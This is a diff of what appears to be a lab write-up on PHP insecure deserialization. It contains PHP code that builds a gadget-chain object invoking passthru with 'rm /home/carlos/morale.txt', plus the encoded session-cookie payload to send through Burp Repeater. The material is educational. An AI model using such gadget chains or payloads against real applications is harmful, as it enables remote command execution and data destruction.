@@ -170,10 +170,9 @@ public function __construct($default_desc_type, $desc) {
 
 which is exactly what we want and is the same as the third line of our code above: `$test->$command;` which results in our arbitrary code being executed.
 
-I have created a php file to create the final payload with just the parts of the leaked code that are necessary for creating the payload:
+I have prepared a php file for creating the final payload with just the parts of the leaked code that are necessary for creating the payload:
 
 ```php
-
 <?php
 
 class CustomTemplate {
@@ -183,34 +182,14 @@ class CustomTemplate {
     public function __construct() {
         $this->desc = new DefaultMap('passthru');
         $this->default_desc_type = 'rm /home/carlos/morale.txt';
-
-        $this->build_product();
-    }
-
-
-    private function build_product() {
-        $this->product = new Product($this->default_desc_type, $this->desc);
     }
 }
-
-class Product {
-    public $desc;
-
-    public function __construct($default_desc_type, $desc) {
-        $this->desc = $desc->$default_desc_type;
-    }
-}
-
 
 class DefaultMap {
     private $callback;
 
     public function __construct($callback) {
         $this->callback = $callback;
-    }
-
-    public function __get($name) {
-        return call_user_func($this->callback, $name);
     }
 }
 
@@ -227,18 +206,16 @@ echo(urlencode(base64_encode($ser)) . "\n");
 and the output of this code is:
 
 ```
-'rm' is not recognized as an internal or external command,
-operable program or batch file.
-O:14:"CustomTemplate":3:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}s:7:"product";O:7:"Product":1:{s:4:"desc";N;}}
+O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}}
 ===================================================
 base64 endcoded then urlencoded:
-TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjM6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fXM6NzoicHJvZHVjdCI7Tzo3OiJQcm9kdWN0IjoxOntzOjQ6ImRlc2MiO047fX0%3D
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
 ```
 
-Ignore the error, it shows that `passthru` was really executed which is a good sign, also keep in mind that the php serialized object is a binary format meaning it may contain some null characters... so if we copy-paste the cleartext part from the above output:
+Keep in mind that the php serialized object is a binary format meaning it may contain some null characters... so if we copy-paste the cleartext part from the above output:
 
 ```php
-O:14:"CustomTemplate":3:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}s:7:"product";O:7:"Product":1:{s:4:"desc";N;}}
+O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}}
 ```
 
 It won't work, if we want to copy-paste the cleartext version, we need to edit it manually and the final payload will be something like this:
@@ -258,7 +235,7 @@ rather than a CHAR or TEXT field.
  That's why we base64 and url encoded the output to easily be able to copy-paste it as the session cookie. So we copy this part from the output above:
 
  ```
- TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjM6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fXM6NzoicHJvZHVjdCI7Tzo3OiJQcm9kdWN0IjoxOntzOjQ6ImRlc2MiO047fX0%3D
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
  ```
 
  and paste it here in the session cookie in the Burp suite repeater:
